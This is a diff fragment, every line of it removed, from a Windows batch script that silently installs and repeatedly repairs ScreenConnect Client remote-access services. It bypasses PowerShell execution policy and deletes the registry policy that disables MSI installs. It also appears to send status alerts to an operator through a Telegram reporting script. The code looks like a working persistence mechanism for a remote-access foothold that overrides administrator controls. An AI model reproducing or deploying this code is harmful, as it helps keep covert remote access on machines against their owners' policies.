-if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -Extra "%MSI%" -WorkDir "%WD%"`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
-if not defined MSI_SAFE (
-  echo [%TAG%] msi_protect_fail_skip_i>>"%LOG%"
-  del /f /q "%MSI%" >nul 2>&1
-  exit /b 1
-)
-call :NoMsiPolicy
-rem M13/M41: stale primary dir under PF and PF86
-sc query "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
-if errorlevel 1 (
-  if exist "%PF86%\ScreenConnect Client (%KEEP_FP%)" (
-    echo stale_primary_dir_clean_pf86>>"%LOG%"
-    rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
-  )
-  if exist "%ProgramFiles%\ScreenConnect Client (%KEEP_FP%)" (
-    echo stale_primary_dir_clean_pf>>"%LOG%"
-    rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
-  )
-)
-echo [%TAG%] msiexec install>>"%LOG%"
-msiexec /i "%MSI_SAFE%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal.log" >nul 2>&1
-set "MSIEXIT=!ERRORLEVEL!"
-echo [%TAG%] msiexec exit=!MSIEXIT!>>"%LOG%"
-if "!MSIEXIT!"=="1618" (
-  echo [%TAG%] msi_busy_retry>>"%LOG%"
-  timeout /t 30 /nobreak >nul
-  msiexec /i "%MSI_SAFE%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_heal2.log" >nul 2>&1
-  set "MSIEXIT=!ERRORLEVEL!"
-  echo [%TAG%] msiexec_retry exit=!MSIEXIT!>>"%LOG%"
-)
-if /I not "%MSI_SAFE%"=="%MSI%" del /f /q "%MSI_SAFE%" >nul 2>&1
-call :WaitSvc
-call :RestoreAlt
-rem O37: sevrz /i shares legacy UpgradeCodes with gryxa — always re-ensure Gryxa after
-call :EnsureGryxaMust
-exit /b 0
-
-:RepairRegistered
-rem %1=fingerprint - service deleted but product registered: repair by GUID.
-rem M40: label was amputated (body sat after InstallMsi exit /b) so primary heal never ran.
-sc query "ScreenConnect Client (%~1)" >nul 2>&1
-if not errorlevel 1 exit /b 0
-if not exist "%WD%\own_lib.ps1" exit /b 1
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%~1" -WorkDir "%WD%" >>"%LOG%" 2>&1
-call :WaitSvc
-exit /b 0
-
-:RestoreAlt
-rem ALT service gone but still registered (SC-family msiexec side effect) - repair it too.
-sc query "ScreenConnect Client (%ALT_FP%)" >nul 2>&1
-if not errorlevel 1 exit /b 0
-echo alt missing - repair attempt>>"%LOG%"
-if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%ALT_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
-sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
-if not errorlevel 1 set "ALT_OK=1"
-exit /b 0
-
-:NoMsiPolicy
-reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
-reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
-exit /b 0
-
-:WaitSvc
-set "TRIES=0"
-:WaitLoop
-sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
-if not errorlevel 1 (
-  set "INSTALLED=1"
-  set "PRIM_OK=1"
-  exit /b 0
-)
-set /a TRIES+=1
-if %TRIES% GEQ 10 exit /b 1
-ping 127.0.0.1 -n 7 >nul 2>&1
-goto :WaitLoop
-
-:TgState
-set "NEWSTATE=%~1"
-set "MSG=%~2"
-set "OLDSTATE="
-if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
-rem false DOWN after reboot race: primary already Running — do not spam
-if /I "%NEWSTATE%"=="DOWN" (
-  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
-  if not errorlevel 1 (
-    echo tg_skip_down_already_running>>"%LOG%"
-    exit /b 0
-  )
-)
-rem rate-limit repeated DOWN/FAIL: max 1 alert per 6h while stuck
-if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
-if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
-goto :SendAlert
-:MaybeSuppress
-if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
-  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
-  if not errorlevel 1 (
-    echo tg_suppressed_%NEWSTATE%>>"%LOG%"
-    exit /b 0
-  )
-)
-:SendAlert
-echo %NEWSTATE%>"%STATE%"
-echo sent>"%WD%\tg_sent.flag"
-powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %NEWSTATE% -Summary "%MSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
-echo tg state %NEWSTATE% sent>>"%LOG%"
-exit /b 0
